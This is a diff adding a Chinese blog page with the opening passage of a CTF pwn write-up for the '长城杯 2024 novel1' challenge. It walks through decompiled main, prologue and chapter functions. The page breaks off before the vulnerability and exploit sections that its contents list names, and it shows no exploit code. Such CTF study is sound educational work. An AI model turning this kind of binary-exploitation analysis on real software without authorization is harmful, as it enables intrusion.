@@ -1,0 +1,670 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    [长城杯 2024] novel1 | HFTTC&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="[长城杯 2024] novel1NSSCTF 里面有两道长城杯的附件，可以去复现一下：  先对程序基本运行一下：  main 12345678910111213141516171819202122232425int __fastcall __noreturn main(int argc, const char **argv, const char **envp)&#123;     unsign">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[长城杯 2024] novel1">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/05/23/C++PWN/%5B%E9%95%BF%E5%9F%8E%E6%9D%AF2024%5Dnovel1/index.html">
+<meta property="og:site_name" content="HFTTC&#39;s Blog">
+<meta property="og:description" content="[长城杯 2024] novel1NSSCTF 里面有两道长城杯的附件，可以去复现一下：  先对程序基本运行一下：  main 12345678910111213141516171819202122232425int __fastcall __noreturn main(int argc, const char **argv, const char **envp)&#123;     unsign">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1MXn88zcULbR6Hzz/1778045365767-d6a0fc82-346a-426d-9552-80b9e395bc9e-228663.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1MXn88zcULbR6Hzz/1778070651097-0bfa663a-e27a-484b-8965-97ef72bf5dda-382402.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1MXn88zcULbR6Hzz/1778047362675-17e9880e-e717-4c3c-a090-0016fb4aa209-526445.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1MXn88zcULbR6Hzz/1778047377698-a44b281c-4d3f-48b7-b8e5-77c07e09f1d1-965831.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1MXn88zcULbR6Hzz/1778047396569-550a6537-8c48-468c-b4de-430ac52eb8b0-041297.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1MXn88zcULbR6Hzz/1778047416619-def570df-3998-43a4-8f24-5abb465ff5c5-866104.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1MXn88zcULbR6Hzz/1778048658399-9f7c6ed7-54dc-4c3e-a491-ff45194b7060-636073.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1MXn88zcULbR6Hzz/1778048588349-89f39e5a-1cc9-4402-84dd-cfa1eda5c10a-397898.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1MXn88zcULbR6Hzz/1778064750694-69e84df6-540b-44f0-a7c7-0b8ebac371c2-591915.png">
+<meta property="article:published_time" content="2026-05-22T18:46:33.000Z">
+<meta property="article:modified_time" content="2026-05-22T18:58:43.405Z">
+<meta property="article:author" content="HFTTC">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1MXn88zcULbR6Hzz/1778045365767-d6a0fc82-346a-426d-9552-80b9e395bc9e-228663.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="HFTTC's Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/catalog">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">目录</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/categories">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">分类</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/tags">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">标签</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="[长城杯 2024] novel1">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">[长城杯 2024] novel1</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%95%BF%E5%9F%8E%E6%9D%AF-2024-novel1"><span class="toc-number">1.</span> <span class="toc-text">[长城杯 2024] novel1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">1.1.</span> <span class="toc-text">main</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#prologue-%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">prologue()：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#chapter"><span class="toc-number">1.3.</span> <span class="toc-text">chapter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#part1"><span class="toc-number">1.4.</span> <span class="toc-text">part1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#part2"><span class="toc-number">1.5.</span> <span class="toc-text">part2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E6%A1%B6-Bucket-%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="toc-number">1.5.1.</span> <span class="toc-text">哈希桶 (Bucket) 的概念</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%87%B4%E5%91%BD%E7%9A%84-std-copy-%E6%93%8D%E4%BD%9C"><span class="toc-number">1.5.2.</span> <span class="toc-text">致命的 std::copy 操作</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#epilogue"><span class="toc-number">1.6.</span> <span class="toc-text">epilogue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RACHE"><span class="toc-number">1.7.</span> <span class="toc-text">RACHE</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">132</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/categories" aria-label="分类"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">分类</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/tags" aria-label="标签"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">标签</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-C++PWN/[长城杯2024]novel1" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-05-22T18:46:33.000Z" itemprop="datePublished">2026-05-23</time>
+    <time style="display: none;" id="post-update-time">2026-05-23</time>
+  </span>
+    <span class="article-date-link icon-calendar-plus" data-aos="zoom-in">
+      <time datetime="2026-05-22T18:58:43.405Z" itemprop="dateModified">2026-05-23</time>
+    </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="长城杯-2024-novel1"><a href="#长城杯-2024-novel1" class="headerlink" title="[长城杯 2024] novel1"></a>[长城杯 2024] novel1</h1><p>NSSCTF 里面有两道长城杯的附件，可以去复现一下：</p>
+<p><img src="/HFTTC.github.io/images/pwn/1MXn88zcULbR6Hzz/1778045365767-d6a0fc82-346a-426d-9552-80b9e395bc9e-228663.png" alt="1778045365767-d6a0fc82-346a-426d-9552-80b9e395bc9e.png"></p>
+<p>先对程序基本运行一下：</p>
+<p><img src="/HFTTC.github.io/images/pwn/1MXn88zcULbR6Hzz/1778070651097-0bfa663a-e27a-484b-8965-97ef72bf5dda-382402.png" alt="1778070651097-0bfa663a-e27a-484b-8965-97ef72bf5dda.png"></p>
+<h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p><img src="/HFTTC.github.io/images/pwn/1MXn88zcULbR6Hzz/1778047362675-17e9880e-e717-4c3c-a090-0016fb4aa209-526445.png" alt="1778047362675-17e9880e-e717-4c3c-a090-0016fb4aa209.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> n3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">    prologue();</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        n3 = chapter();</span><br><span class="line">        <span class="keyword">if</span> ( n3 == <span class="number">3</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( n3 &lt;= <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( n3 == <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                part1();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( n3 == <span class="number">2</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                part2();</span><br><span class="line">                epilogue();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    epilogue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="prologue-："><a href="#prologue-：" class="headerlink" title="prologue()："></a>prologue()：</h4><p><img src="/HFTTC.github.io/images/pwn/1MXn88zcULbR6Hzz/1778047377698-a44b281c-4d3f-48b7-b8e5-77c07e09f1d1-965831.png" alt="1778047377698-a44b281c-4d3f-48b7-b8e5-77c07e09f1d1.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">prologue</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unordered_map</span>&lt;<span class="type">unsigned</span> <span class="type">int</span>,<span class="type">unsigned</span> <span class="type">long</span>&gt;::clear(&amp;bloodstains);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;A Study in Scarlet, 1887&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Author: &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> fgets(author, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">unordered_map</span>&lt;<span class="type">unsigned</span> <span class="type">int</span>,<span class="type">unsigned</span> <span class="type">long</span>&gt;::clear(&amp;bloodstains);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>作用：清空一个名为 <code>bloodstains</code> 的 C++ 无序映射表（哈希表）。这个表的键 Key 是无符号整数 <code>unsigned int</code>，值 Value 是无符号长整数 <code>unsigned long</code>。</li>
+<li>代码特征：这是典型的反编译器生成的语法。在正常的 C++ 源码中，程序员只会写 bloodstains.clear();。反编译器将其还原成了底层的函数调用形式。</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Author: &quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>简化一下就是<code>std::cout &lt;&lt; &quot;Author: &quot;;</code></p>
+<ul>
+<li><code>std::cout</code> 是 C++ 中的标准输出流对象（通常指向终端屏幕）。</li>
+<li>前面的 &amp; 取地址符表示将 <code>std::cout</code> 对象的内存地址作为第一个参数传进函数。把接下来的内容写入到这个输出流里</li>
+</ul>
+<h4 id="chapter"><a href="#chapter" class="headerlink" title="chapter"></a>chapter</h4><p>chapter 函数，包含了菜单和 index 的输入</p>
+<p><img src="/HFTTC.github.io/images/pwn/1MXn88zcULbR6Hzz/1778047396569-550a6537-8c48-468c-b4de-430ac52eb8b0-041297.png" alt="1778047396569-550a6537-8c48-468c-b4de-430ac52eb8b0.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">chapter</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 v0; <span class="comment">// rax</span></span><br><span class="line">    __int64 v1; <span class="comment">// rax</span></span><br><span class="line">    __int64 v2; <span class="comment">// rax</span></span><br><span class="line">    __int64 v3; <span class="comment">// rax</span></span><br><span class="line">    __int64 v4; <span class="comment">// rax</span></span><br><span class="line">    __int64 v5; <span class="comment">// rax</span></span><br><span class="line">    __int64 v6; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> p_n3; <span class="comment">// [rsp+Ch] [rbp-44h] BYREF</span></span><br><span class="line">    _BYTE p_n3_4[<span class="number">47</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">    __int64 v10; <span class="comment">// [rsp+3Fh] [rbp-11h] BYREF</span></span><br><span class="line"></span><br><span class="line">    v0 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    v1 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(v0, <span class="string">&quot;Part I: The Reminiscences of Watson, 1881&quot;</span>);</span><br><span class="line">    v2 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    v3 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(v2, <span class="string">&quot;Part II: The Country of the Saints, 1847&quot;</span>);</span><br><span class="line">    v4 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    v5 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(v4, <span class="string">&quot;Epilogue&quot;</span>);</span><br><span class="line">    v6 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(v5, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Chapter: &quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::istream::operator&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;p_n3);</span><br><span class="line">    <span class="keyword">if</span> ( !p_n3 || p_n3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(&amp;v10);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string&lt;<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;(p_n3_4, <span class="string">&quot;Invalid chapter.&quot;</span>, &amp;v10);</span><br><span class="line">        fragment(p_n3_4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p_n3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以最简洁的 C++代码来看就是一段连续输出和部分输入</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">chapter</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> choice;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span></span><br><span class="line">              &lt;&lt; <span class="string">&quot;Part I: The Reminiscences of Watson, 1881&quot;</span> </span><br><span class="line">              &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span></span><br><span class="line">              &lt;&lt; <span class="string">&quot;Part II: The Country of the Saints, 1847&quot;</span></span><br><span class="line">              &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span></span><br><span class="line">              &lt;&lt; <span class="string">&quot;Epilogue&quot;</span></span><br><span class="line">              &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span></span><br><span class="line">              &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Chapter: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; choice;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (choice == <span class="number">0</span> || choice &gt; <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> error_msg = <span class="string">&quot;Invalid chapter.&quot;</span>;</span><br><span class="line">        fragment(error_msg); <span class="comment">// 可能是一个自定义的错误处理或报错退出函数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> choice;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
